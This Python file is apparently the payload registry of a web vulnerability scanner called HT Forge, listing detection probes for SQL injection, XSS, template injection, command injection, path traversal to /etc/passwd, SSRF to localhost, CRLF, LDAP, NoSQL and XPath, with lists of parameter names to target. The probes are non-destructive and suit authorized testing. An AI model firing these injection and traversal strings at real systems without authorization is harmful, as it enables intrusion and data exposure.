"""HT Forge 1.8 - curated detection payload registry.

Inspired by public web-security payload taxonomies, including
PayloadsAllTheThings. This file intentionally contains bounded,
non-destructive probes for authorized assessments and lab/CTF use; it is not
a verbatim mirror of any external repository.
"""
from typing import Dict, Tuple

SQLI_ERROR = (
    "'", '"', ";", ")", "' )", "1'", '1"', "1)", "1))", "1*",
    "'-- -", '"-- -', ")'-- -", '")-- -', "'#", '"#', "'/*", '"/*',
    "';--", '";--', "' OR 1=1-- -", '" OR 1=1-- -',
    "%27", "%22", "%23", "%3B", "%29", "%2A", "%2527", "%2522",
)

SQLI_BOOLEAN_NUM = (
    ("{v} AND 1=1", "{v} AND 1=2"),
    ("{v} OR 1=1", "{v} OR 1=2"),
    ("{v} AND 2=2", "{v} AND 2=3"),
    ("{v} AND 1=1-- -", "{v} AND 1=2-- -"),
    ("{v} OR 1=1-- -", "{v} OR 1=2-- -"),
    ("{v} AND 1=1#", "{v} AND 1=2#"),
    ("{v} OR 1=1#", "{v} OR 1=2#"),
    ("{v} AND 1=1/*x*/", "{v} AND 1=2/*x*/"),
    ("{v} AND 3=3", "{v} AND 3=4"),
    ("{v} OR 3=3", "{v} OR 3=4"),
)

SQLI_BOOLEAN_TEXT = (
    ("{v}' AND '1'='1", "{v}' AND '1'='2"),
    ("{v}' OR '1'='1", "{v}' OR '1'='2"),
    ('{v}" AND "1"="1', '{v}" AND "1"="2'),
    ("{v}' AND 'a'='a'-- -", "{v}' AND 'a'='b'-- -"),
    ("{v}' OR 'a'='a'-- -", "{v}' OR 'a'='b'-- -"),
    ("{v}' AND 'x'='x'#", "{v}' AND 'x'='y'#"),
    ("{v}' OR 'x'='x'#", "{v}' OR 'x'='y'#"),
    ("{v}') AND ('1'='1", "{v}') AND ('1'='2"),
)

XSS = (
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "</title><script>alert(1)</script>",
    "</textarea><script>alert(1)</script>",
    "</script><script>alert(1)</script>",
    "\"><img src=x onerror=alert(1)>",
    "'><svg onload=alert(1)>",
)

# Additional inert context probes. They use a local marker and do not access,
# transmit, or modify credentials, cookies, storage, or remote resources.
XSS_CONTEXT = (
    '<script>console.log("HTFORGE_XSS")</script>',
    '<img src=x onerror=console.log("HTFORGE_XSS")>',
    '<svg/onload=console.log("HTFORGE_XSS")>',
    '<input autofocus onfocus=console.log("HTFORGE_XSS")>',
    '</title><img src=x onerror=console.log("HTFORGE_XSS")>',
    '</textarea><svg/onload=console.log("HTFORGE_XSS")>',
)

SSTI = (
    ("{{7*7}}", "49"),
    ("${7*7}", "49"),
    ("<%= 7*7 %>", "49"),
    ("#{7*7}", "49"),
    ("{{7+7}}", "14"),
    ("${7+7}", "14"),
    ("<%= 7+7 %>", "14"),
    ("@{7*7}", "49"),
)

CMDI_UNIX = (
    "; echo {token}",
    "&& echo {token}",
    "| echo {token}",
    "$(echo {token})",
    "`echo {token}`",
)
CMDI_WINDOWS = (
    "& echo {token}",
    "&& echo {token}",
    "| echo {token}",
)

TRAVERSAL = (
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "..%252f..%252f..%252f..%252fetc%252fpasswd",
    "..%255c..%255c..%255c..%255cwindows%255csystem32%255cdrivers%255cetc%255chosts",
)

SSRF = (
    "http://127.0.0.1/", "http://localhost/", "http://127.0.0.1:80/",
    "http://[::1]/", "http://0.0.0.0/",
)
OPEN_REDIRECT = ("https://example.com/", "//example.com/", "https://example.com/%2f%2e%2e")
CRLF = ("forge%0d%0aX-HT-Forge: canary", "forge%0aX-HT-Forge: canary", "forge%0dX-HT-Forge: canary")
LDAP = ("*", "(", ")", r"\\", "*)(uid=*)", "(|(uid=*))")
NOSQL = ("'", '"', "{", "}", "[$ne]", "{$ne:null}", "[$gt]", '{$gt:""}')
XPATH = ("'", '"', "' or '1'='1", '" or "1"="1', "'] | //* | ['")
XML_SYNTAX = (
    '<?xml version="1.0"?><root>forge</root>',
    '<root><item>forge</item></root>',
    '<root>&amp;</root>',
)

PARAM_HINTS: Dict[str, Tuple[str, ...]] = {
    "sqli": ("id","uid","user","username","password","q","query","search","sort","filter","order","category","name"),
    "xss": ("q","query","search","name","title","message","comment","url","next","redirect","answer","template"),
    "ssti": ("template","view","name","title","subject","message","content","preview"),
    "cmdi": ("cmd","command","exec","execute","ping","host","ip","query","target"),
    "ssrf": ("url","uri","src","source","image","avatar","callback","webhook","endpoint","dest"),
    "traversal": ("file","path","filename","filepath","page","include","template","doc","folder"),
    "idor": ("id","uid","user_id","account_id","order_id","invoice_id","file_id","document_id","profile_id"),
}

PAYLOAD_COUNTS = {
    "sqli_error": len(SQLI_ERROR),
    "sqli_boolean_num_pairs": len(SQLI_BOOLEAN_NUM),
    "sqli_boolean_text_pairs": len(SQLI_BOOLEAN_TEXT),
    "xss": len(XSS),
    "xss_context": len(XSS_CONTEXT),
    "ssti": len(SSTI),
    "cmdi_unix": len(CMDI_UNIX),
    "cmdi_windows": len(CMDI_WINDOWS),
    "traversal": len(TRAVERSAL),
    "ssrf": len(SSRF),
    "open_redirect": len(OPEN_REDIRECT),
    "crlf": len(CRLF),
    "ldap": len(LDAP),
    "nosql": len(NOSQL),
    "xpath": len(XPATH),
    "xml_syntax": len(XML_SYNTAX),
}
